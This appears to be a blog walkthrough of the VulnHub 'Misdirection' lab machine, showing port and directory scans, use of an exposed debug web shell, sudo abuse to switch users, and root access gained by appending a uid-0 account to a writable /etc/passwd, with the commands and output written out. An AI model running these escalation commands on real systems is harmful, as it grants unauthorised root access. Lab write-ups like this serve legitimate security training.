@@ -1,0 +1,140 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Misdirection Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>Misdirection Walkthrough</h1>
+
+    <hr>
+
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#www-data">Shell - www-data</a></li>
+        <li><a href="#brexit">Shell - brexit</a></li>
+        <li><a href="#root">Shell - root</a></li>
+    </ul>
+
+    <h2><a id="summary">Summary</a></h2>
+    
+    <p>This box was very easy.  The most difficult part was avoiding all the rabbit holes during the initial phase of web enumeration.  Once you get past all the rabbit holes, there is simply an interactive webshell waiting for us to find.  We gain our www-data reverse shell.  www-data has the sudo ability to execute bash as brexit.  We gain our brexit shell.  The user brexit has write access to /etc/passwd.  We simply add another root user and we have our root shell.</p>
+
+    <h2><a id="portscan">Port Scanning</a></h2>
+
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Thu Sep 23 17:06:35 2021 as: nmap -p- -oN ping_tcp 10.0.0.17&#13;&#10;Nmap scan report for 10.0.0.17&#13;&#10;Host is up (0.0016s latency).&#13;&#10;Not shown: 65531 closed ports&#13;&#10;PORT     STATE SERVICE&#13;&#10;22/tcp   open  ssh&#13;&#10;80/tcp   open  http&#13;&#10;3306/tcp open  mysql&#13;&#10;8080/tcp open  http-proxy&#13;&#10;MAC Address: 00:0C:29:F8:19:B4 (VMware)&#13;&#10;&#13;&#10;# Nmap done at Thu Sep 23 17:06:44 2021 -- 1 IP address (1 host up) scanned in 8.22 seconds
+    </pre>
+
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Thu Sep 23 17:07:03 2021 as: nmap -p22,80,3306,8080 -sV -sC -oN script_tcp 10.0.0.17&#13;&#10;Nmap scan report for 10.0.0.17&#13;&#10;Host is up (0.00020s latency).&#13;&#10;&#13;&#10;PORT     STATE SERVICE VERSION&#13;&#10;22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&#13;&#10;| ssh-hostkey: &#13;&#10;|   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)&#13;&#10;|   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)&#13;&#10;|_  256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)&#13;&#10;80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)&#13;&#10;|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1&#13;&#10;|_http-title: Site doesn&apos;t have a title (text/html; charset=utf-8).&#13;&#10;3306/tcp open  mysql   MySQL (unauthorized)&#13;&#10;|_ssl-cert: ERROR: Script execution failed (use -d to debug)&#13;&#10;|_ssl-date: ERROR: Script execution failed (use -d to debug)&#13;&#10;|_sslv2: ERROR: Script execution failed (use -d to debug)&#13;&#10;|_tls-alpn: ERROR: Script execution failed (use -d to debug)&#13;&#10;|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)&#13;&#10;8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))&#13;&#10;|_http-server-header: Apache/2.4.29 (Ubuntu)&#13;&#10;|_http-title: Apache2 Ubuntu Default Page: It works&#13;&#10;MAC Address: 00:0C:29:F8:19:B4 (VMware)&#13;&#10;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Thu Sep 23 17:07:49 2021 -- 1 IP address (1 host up) scanned in 45.63 seconds
+    </pre>
+
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <li>I began by using gobuster against both port 80 and 8080.  Apparently the difficulty of gaining a foothold on this box comes from being able to avoid rabbit holes.  After going down a few and coming back to my gobuster results I found the way in.  Here is the gobuster scan that revelead the way in (as well as a rabbit hole)</li>
+
+    <pre>
+┌──(kali㉿kali)-[~/Documents/VulnHub/Misdirection]
+└─$ cat WebEnum/10.0.0.17:8080-raft | grep -v 403
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.0.17:8080
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+[+] Negative Status codes:   404
+[+] Exclude Length:          50
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/09/23 17:25:33 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 314] [--> http://10.0.0.17:8080/images/]
+/js                   (Status: 301) [Size: 310] [--> http://10.0.0.17:8080/js/]    
+/css                  (Status: 301) [Size: 311] [--> http://10.0.0.17:8080/css/]   
+/scripts              (Status: 301) [Size: 315] [--> http://10.0.0.17:8080/scripts/]
+/help                 (Status: 301) [Size: 312] [--> http://10.0.0.17:8080/help/]   
+/.                    (Status: 200) [Size: 10918]                                   
+/wordpress            (Status: 301) [Size: 317] [--> http://10.0.0.17:8080/wordpress/]
+/manual               (Status: 301) [Size: 314] [--> http://10.0.0.17:8080/manual/]   
+/debug                (Status: 301) [Size: 313] [--> http://10.0.0.17:8080/debug/]    
+/development          (Status: 301) [Size: 319] [--> http://10.0.0.17:8080/development/]
+/shell                (Status: 301) [Size: 313] [--> http://10.0.0.17:8080/shell/]      
+===============================================================
+2021/09/23 17:25:36 Finished
+===============================================================
+    </pre>
+
+    <h2><a id="www-data">Shell - www-data</a></h2>
+
+    <li>Simply by going to /debug we are prompted with a fully interactive web shell.  I use a bash command the create a reverse shell on my machine.</li>
+
+    <img src="../images/misdirection/foothold.png">
+
+    <br>
+    <br>
+
+    <h2><a id="brexit">Shell - Brexit</a></h2>
+
+    <li>The first thing I did was run "sudo -l" to see if we have any sudo access.</li>
+
+    <pre>
+www-data@misdirection:/var/www/html/debug$ sudo -l&#13;&#10;Matching Defaults entries for www-data on localhost:&#13;&#10;    env_reset, mail_badpass,&#13;&#10;    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&#13;&#10;&#13;&#10;User www-data may run the following commands on localhost:&#13;&#10;    (brexit) NOPASSWD: /bin/bash
+    </pre>
+
+    <li>It appears we have the ability to run bash as the user brexit.  This givues a quick and easy shell as brexit.</li>
+
+    <pre>
+www-data@misdirection:/var/www/html/debug$ sudo -u brexit /bin/bash&#13;&#10;brexit@misdirection:/var/www/html/debug$ id&#13;&#10;uid=1000(brexit) gid=1000(brexit) groups=1000(brexit),24(cdrom),30(dip),46(plugdev),108(lxd)
+    </pre>
+
+    <li>I decided to create an SSH key for the user brexit just because SSH shells function the best.</li>
+    <ul>
+        <li><a href="https://pusher91.github.io/Hacking/Linux_PrivEsc.html#ssh">SSH Shell Setup Instructions</a></li>
+    </ul>
+    <li>I use scp to transfer linpeas to the machine</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Misdirection]&#13;&#10;&boxur;&HorizontalLine;$ scp -i brexit_rsa /opt/PEASS-ng/linPEAS/linpeas.sh brexit@10.0.0.17:/tmp &#13;&#10;linpeas.sh                                                                         100%  459KB  93.1MB/s   00:00  
+    </pre>
+
+    <li>It turns out we have write access to /etc/passwd</li>
+
+    <br>
+
+    <h2><a id="root">Shell - Root</a></h2>
+
+    <li>I choose to add another root user named root2 to /etc/passwd.</li>
+    <ul>
+        <li>echo "root2:BPVj03G7y5QdY:0:0:root:/root:/bin/bash" >> /etc/passwd</li>
+        <ul>
+            <li>I generated the password hash "BPVj03G7y5QdY" using the "openssl" command</li>
+            <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Misdirection]&#13;&#10;&boxur;&HorizontalLine;$ openssl passwd root                                                                                        130 &Cross;&#13;&#10;BPVj03G7y5QdY
+            </pre>
+        </ul>
+    </ul>
+
+    <li>Getting root</li>
+
+    <pre>
+brexit@misdirection:/tmp$ echo &quot;root2:BPVj03G7y5QdY:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd&#13;&#10;brexit@misdirection:/tmp$ su root2&#13;&#10;Password: &#13;&#10;root@misdirection:/tmp# id&#13;&#10;uid=0(root) gid=0(root) groups=0(root)
+    </pre>
+
+</body>
+</html>
+
